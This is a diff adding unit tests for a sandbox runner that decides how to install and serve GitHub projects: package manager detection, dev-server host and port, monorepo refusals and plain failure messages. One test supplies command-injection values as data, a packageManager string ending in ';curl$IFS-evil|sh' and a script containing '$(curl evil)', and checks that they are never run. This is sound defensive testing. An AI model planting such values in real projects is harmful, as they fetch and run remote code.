@@ -3,7 +3,8 @@
 // so no token is ever spent. `--unit` runs the checks that need no Docker (build spec §6.1, U1-U9):
 // path rules, tool-call parsing, the receipt line and verdicts, the check messages, the tamper guard,
 // chat() against the fake gateway, run() with UTF-8 output, and the PNG helpers once they exist;
-// U11 drives the sandbox's own network (create, destroy, clean-up) against a fake docker.
+// U11 drives the sandbox's own network (create, destroy, clean-up) against a fake docker; U12 checks
+// the GitHub path's decisions (package manager, start command, refusals, setup sentences).
 // Without flags it also runs the sandbox scenarios (§6.2, S1-S10) on the Lumen sample with a one-cell
 // matrix: an honest fix, a cover-up with the gate on and off, a measurement tamper, paths out of the
 // project, every cap (the soft stop of a model call included), malformed tool-call arguments, an
@@ -719,6 +720,150 @@ async function u11() {
   }
 }
 
+/**
+ * U12: the GitHub path's decisions, on the facts the runner reads inside a sandbox, with no Docker:
+ * the package manager, the start command (a dev server bound to 127.0.0.1:3000, its own --port and
+ * --host dropped), monorepos and projects with nothing to serve refused, the ports a dev server
+ * prints, and one plain sentence for every setup failure. The repositories are shaped like the ones
+ * measured on the VM (bench/2026-11-04-github-path.md).
+ */
+async function u12() {
+  const rt = await load('../runner/run-task.mjs');
+  if (!rt) return;
+  const { planProject, describePlan, portsInLog, installFailure, installRetry, cloneFailure, serveFailure, offAllowlistHost, SAY, SetupError } = rt;
+  const pkg = (scripts, extra = {}) => ({ scripts, packageManager: null, workspaces: 0, deps: 12, ...extra });
+  const facts = (o = {}) => ({ node: 'v22.23.4', files: { 'package.json': true, ...(o.files ?? {}) }, pkg: o.pkg ?? pkg({ dev: 'vite' }), pkgError: null, index: o.index ?? [''], pnpmWorkspace: o.pnpmWorkspace ?? null, yarnrc: null, yarnLock: o.yarnLock ?? null, pnpmLock: o.pnpmLock ?? null, yarnPath: o.yarnPath ?? null });
+  const refusal = (f) => { try { planProject(f); return null; } catch (err) { return err; } };
+  const tail = (p) => p.start.split(' && exec ').pop();
+
+  // Vite + React with package-lock.json (TailAdmin): npm ci, Vite bound to 127.0.0.1:3000.
+  const vite = planProject(facts({ files: { 'package-lock.json': true } }));
+  check('U12 a Vite app with package-lock.json: npm ci, and vite bound to 127.0.0.1:3000 with --strictPort (Vite alone listens on localhost, which can be ::1)',
+    vite.pm === 'npm' && vite.lock === true && vite.install === true && tail(vite) === 'vite --host 127.0.0.1 --port 3000 --strictPort'
+      && vite.start.includes('/work/app/node_modules/.bin:') && /BROWSER=none/.test(vite.start),
+    `${describePlan(vite)} | ${tail(vite)}`);
+
+  // Vite + Vue on pnpm 12 with catalogs (vitesse-lite): the field's version, its own --port 3333 dropped,
+  // and a pnpm-workspace.yaml without packages (catalogs only) is not a monorepo.
+  const vitesse = planProject(facts({
+    files: { 'pnpm-lock.yaml': true }, pnpmLock: "lockfileVersion: '9.0'\n",
+    pkg: pkg({ dev: 'vite --port 3333 --open', build: 'vite build' }, { packageManager: 'pnpm@12.3.4+sha512.abcdef' }),
+    pnpmWorkspace: 'catalogs:\n  frontend:\n    vue: ^3.5.0\nonlyBuiltDependencies:\n  - esbuild\n',
+  }));
+  check('U12 pnpm from the packageManager field (pnpm@12.3.4+sha512…), catalogs alone are no monorepo, and the script\'s own --port 3333 gives way to 3000',
+    vitesse.pm === 'pnpm' && vitesse.pmInfo.version === '12.3.4' && tail(vitesse) === 'vite --open --host 127.0.0.1 --port 3000 --strictPort',
+    `${describePlan(vitesse)}`);
+
+  // Astro with pnpm-lock.yaml only (astro-paper): pnpm 10 from lockfile 9.0.
+  const astro = planProject(facts({ files: { 'pnpm-lock.yaml': true }, pnpmLock: "lockfileVersion: '9.0'\n", pkg: pkg({ dev: 'astro dev', build: 'astro build' }) }));
+  const next = planProject(facts({ pkg: pkg({ dev: 'next dev --turbopack -p 4000', start: 'next start' }) }));
+  const nextStart = planProject(facts({ pkg: pkg({ start: 'next start' }) }));
+  check('U12 Astro and Next.js: pnpm 10 for lockfile 9.0; astro dev and next dev get Ring\'s host and port, their own -p is dropped, next start becomes next dev',
+    astro.pmInfo.version === '10' && tail(astro) === 'astro dev --host 127.0.0.1 --port 3000'
+      && tail(next) === 'next dev --turbopack --hostname 127.0.0.1 --port 3000' && tail(nextStart) === 'next dev --hostname 127.0.0.1 --port 3000',
+    `${tail(astro)} | ${tail(next)} | ${tail(nextStart)}`);
+
+  // Scripts that are not one plain command run through the package manager, with PORT and HOST set.
+  const crossEnv = planProject(facts({ files: { 'yarn.lock': true, '.yarnrc.yml': true }, yarnLock: '__metadata:\n  version: 6\n', pkg: pkg({ dev: 'cross-env INIT_CWD=$PWD next dev' }, { packageManager: 'yarn@3.6.1' }) }));
+  const compound = planProject(facts({ pkg: pkg({ dev: 'npm run build:css && vite' }) }));
+  const viaNpmRun = planProject(facts({ pkg: pkg({ dev: 'npm run start', start: 'vite --port 5173' }) }));
+  check('U12 a script with $ or && runs as `<pm> run dev` with PORT=3000 HOST=127.0.0.1; `npm run start` is followed to the vite it runs',
+    tail(crossEnv) === 'yarn run dev' && /PORT=3000 HOST=127\.0\.0\.1/.test(crossEnv.start) && crossEnv.pmInfo.berry === true && crossEnv.pmInfo.version === '3.6.1'
+      && tail(compound) === 'npm run dev' && tail(viaNpmRun) === 'vite --host 127.0.0.1 --port 3000 --strictPort' && viaNpmRun.script === 'start',
+    `${tail(crossEnv)} | ${tail(compound)} | ${tail(viaNpmRun)}`);
+
+  // Yarn 1, Yarn 2+ with its own yarnPath, bun.
+  const yarn1 = planProject(facts({ files: { 'yarn.lock': true }, yarnLock: '# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n# yarn lockfile v1\n', pkg: pkg({ start: 'react-scripts start' }) }));
+  const yarnPath = planProject(facts({ files: { 'yarn.lock': true, '.yarnrc.yml': true }, yarnLock: '__metadata:\n', yarnPath: '.yarn/releases/yarn-4.5.0.cjs' }));
+  const bun = planProject(facts({ files: { 'bun.lock': true } }));
+  check('U12 yarn 1 from a v1 lock file (react-scripts reads PORT and HOST), yarn 2+ from the repository\'s own yarnPath, and bun.lock falls back to npm with a note',
+    yarn1.pm === 'yarn' && yarn1.pmInfo.berry === false && yarn1.pmInfo.version === '1' && tail(yarn1) === 'react-scripts start'
+      && yarnPath.pmInfo.berry === true && yarnPath.pmInfo.yarnPath === '.yarn/releases/yarn-4.5.0.cjs'
+      && bun.pm === 'npm' && bun.lock === false && bun.notes.some((n) => /bun is not in the sandbox/.test(n)),
+    `${describePlan(yarn1)} | ${describePlan(yarnPath)} | ${describePlan(bun)}`);
+
+  // Values from the repository never reach a command unchecked.
+  const hostile = planProject(facts({ files: { 'pnpm-lock.yaml': true }, pkg: pkg({ dev: 'vite' }, { packageManager: 'pnpm@1.0.0;curl$IFS-evil|sh' }) }));
+  const escape = planProject(facts({ pkg: pkg({ dev: 'vite --port $(curl evil)' }) }));
+  check('U12 a packageManager version with shell characters is ignored, and a script with $(…) is never rewritten, only run by its package manager',
+    hostile.pmInfo.version === 'latest' && !/curl/.test(hostile.start) && tail(escape) === 'npm run dev' && !/curl/.test(escape.start),
+    `${hostile.pmInfo.version} | ${tail(escape)}`);
+
+  // Static sites, and projects with nothing to serve.
+  const site = planProject({ files: { 'package.json': false }, index: [''] });
+  const inPublic = planProject({ files: { 'package.json': false }, index: ['public', 'docs'] });
+  const noScripts = planProject(facts({ pkg: pkg({ build: 'tailwindcss -o out.css' }), index: ['src'] }));
+  const nothing = refusal({ files: { 'package.json': false }, index: [] });
+  const noScriptsNoIndex = refusal(facts({ pkg: pkg({ build: 'tsc' }), index: [] }));
+  check('U12 a static site is served from its root, else from the first of public/, src/, docs/…; no dev or start script serves index.html; nothing to serve is refused',
+    site.static && site.install === false && /static-server\.mjs \/work\/app 3000$/.test(site.start) && /static-server\.mjs \/work\/app\/public 3000$/.test(inPublic.start)
+      && noScripts.install === true && /\/work\/app\/src 3000$/.test(noScripts.start)
+      && nothing instanceof SetupError && nothing.publicMessage === SAY.nothingToServe && noScriptsNoIndex?.publicMessage === SAY.nothingToServe,
+    `${describePlan(site)} | ${describePlan(inPublic)} | ${describePlan(noScripts)} | ${nothing?.publicMessage}`);
+
+  // Monorepos are refused with one sentence; a broken package.json too.
+  const monos = [
+    facts({ pkg: pkg({ dev: 'turbo dev' }, { workspaces: 3 }) }),
+    facts({ files: { 'pnpm-lock.yaml': true }, pnpmWorkspace: "packages:\n  - 'apps/*'\n  - 'packages/*'\n" }),
+    facts({ pnpmWorkspace: "packages: ['apps/*']\n" }),
+    facts({ files: { 'lerna.json': true } }),
+  ].map(refusal);
+  const notMono = [facts({ pnpmWorkspace: "packages:\n  - '.'\n" }), facts({ pnpmWorkspace: 'onlyBuiltDependencies:\n  - sharp\n' })].map(refusal);
+  const broken = refusal({ files: { 'package.json': true }, pkg: null, pkgError: 'Unexpected token } in JSON at position 80', index: [''] });
+  check('U12 workspaces, a pnpm-workspace.yaml that lists packages (block or flow) and lerna.json are refused as monorepos; one listing only "." is not',
+    monos.every((e) => e?.publicMessage === SAY.monorepo) && notMono.every((e) => e === null) && broken?.publicMessage === SAY.badPackageJson,
+    monos.map((e) => e?.message ?? 'not refused').join('; '));
+
+  // The ports a dev server prints.
+  const viteLog = '\x1b[32m\x1b[1mVITE\x1b[22m v8.3.0\x1b[39m  ready in 812 ms\n\n  ➜  \x1b[1mLocal\x1b[22m:   \x1b[36mhttp://localhost:\x1b[1m5173\x1b[22m/\x1b[39m\n  ➜  Network: use --host to expose\n';
+  const ports = [portsInLog(viteLog), portsInLog(' ┃ Local    http://[::1]:4321/\n'), portsInLog('- Local:        http://localhost:3000\n- Network:      http://172.20.0.2:3000'), portsInLog('Server listening on port 8080'), portsInLog('see https://nextjs.org/docs for more')];
+  check('U12 portsInLog reads Vite\'s banner through its colour codes, [::1]:port, Next.js\' Local line and "listening on port"; a link without a port is no port',
+    JSON.stringify(ports) === JSON.stringify([[5173], [4321], [3000], [8080], []]), JSON.stringify(ports));
+
+  // One plain sentence for each failure, from the output.
+  const sentences = {
+    catalog: installFailure('npm error code EUNSUPPORTEDPROTOCOL\nnpm error Unsupported URL Type "catalog:": catalog:frontend', { code: 1, pm: 'npm' }),
+    googleapis: installFailure('Error: getaddrinfo ENOTFOUND storage.googleapis.com\n    at GetAddrInfoReqWrap.onlookup', { code: 1 }),
+    tunnel: installFailure('npm error request to https://npm.pkg.github.com/@acme%2fui failed, reason: tunneling socket could not be established, statusCode=403', { code: 1 }),
+    private: installFailure('npm error 404 Not Found - GET https://registry.npmjs.org/@acme%2fprivate-ui - Not found', { code: 1 }),
+    space: installFailure('npm error code ENOSPC\nnpm error nospc ENOSPC: no space left on device, write', { code: 1 }),
+    engine: installFailure('error ERR_PNPM_UNSUPPORTED_ENGINE  Unsupported environment (bad pnpm and/or Node.js version)', { code: 1, pm: 'pnpm' }),
+    time: installFailure('', { code: 124 }),
+    memory: installFailure('Killed', { code: 137 }),
+    transient: offAllowlistHost('npm error network request to https://registry.npmjs.org/react failed, reason: ECONNREFUSED'),
+  };
+  const sentenceOk = sentences.catalog === "The project's dependencies could not be installed with npm." && /storage\.googleapis\.com, which is outside/.test(sentences.googleapis)
+    && /npm\.pkg\.github\.com, which is outside/.test(sentences.tunnel) && sentences.private === SAY.installPrivate && sentences.space === SAY.installSpace
+    && sentences.engine === SAY.installNode && sentences.time === SAY.installTime && sentences.memory === SAY.installMemory && sentences.transient === null;
+  check('U12 install failures: off-allowlist hosts are named, a private package, no space, a Node version, time, memory; a refused allowlisted host is not called off-allowlist',
+    sentenceOk, JSON.stringify(sentences));
+
+  const retries = [
+    installRetry({ pm: 'npm', lock: true }, 'npm ci --no-audit --no-fund', 'npm error `npm ci` can only install packages when your package.json and package-lock.json or npm-shrinkwrap.json are in sync.'),
+    installRetry({ pm: 'npm' }, 'npm install --no-audit --no-fund', 'npm error code ERESOLVE\nnpm error ERESOLVE unable to resolve dependency tree'),
+    installRetry({ pm: 'npm' }, 'npm install --no-audit --no-fund --legacy-peer-deps', 'npm error code ERESOLVE'),
+    installRetry({ pm: 'pnpm' }, 'pnpm install --store-dir /work/.pnpm-store', 'ERR_PNPM_OUTDATED_LOCKFILE  Cannot install with "frozen-lockfile"'),
+    installRetry({ pm: 'npm' }, 'npm install --no-audit --no-fund', 'npm error code E404'),
+  ];
+  check('U12 installRetry: npm ci with a stale lock file → npm install; ERESOLVE → --legacy-peer-deps once; pnpm lock-file errors → --no-frozen-lockfile; anything else → no retry',
+    retries[0] === 'npm install --no-audit --no-fund' && retries[1] === 'npm install --no-audit --no-fund --legacy-peer-deps' && retries[2] === null
+      && retries[3] === 'pnpm install --store-dir /work/.pnpm-store --no-frozen-lockfile' && retries[4] === null, JSON.stringify(retries));
+
+  const clone = [cloneFailure("fatal: could not read Username for 'https://github.com': terminal prompts disabled"), cloneFailure('fatal: early EOF')];
+  const serve = [
+    serveFailure('You are using Node.js 22.11.0. Vite requires Node.js version 20.19+ or 22.12+.', { alive: false }),
+    serveFailure('sh: 1: vite: not found', { alive: false }),
+    serveFailure('  VITE v8.3.0  ready in 900 ms', { alive: true }),
+  ];
+  check('U12 clone and dev-server failures: a missing or private repository, any other clone error; a Node version, a server that exited, silence',
+    clone[0] === SAY.notFound && clone[1] === SAY.clone && serve[0] === SAY.serveNode && serve[1] === SAY.serveStopped && serve[2] === SAY.serveTime,
+    JSON.stringify([...clone, ...serve]));
+
+  const all = [...Object.values(SAY), ...Object.values(sentences).filter((s) => typeof s === 'string'), rt.sayOffAllowlist(''), rt.sayInstallFailed('pnpm')];
+  const notOne = all.filter((s) => !/^[A-Z][^\n]{10,180}\.$/.test(s) || /\.\s+[A-Z]/.test(s));
+  check('U12 every setup sentence is one plain sentence (a capital, under 180 characters, one full stop, no newline)', notOne.length === 0, notOne.join(' | ') || `${all.length} sentences`);
+}
+
 // ---------------------------------------------------------------------------------------------
 // Sandbox scenarios (Docker; runc locally, runsc on the VM)
 // ---------------------------------------------------------------------------------------------
@@ -1299,6 +1444,7 @@ try {
   await group('U9', u9);
   await group('U10', u10);
   await group('U11', u11);
+  await group('U12', u12);
   if (!args.unit) await scenarios();
 
   const failed = results.filter((r) => !r.pass);
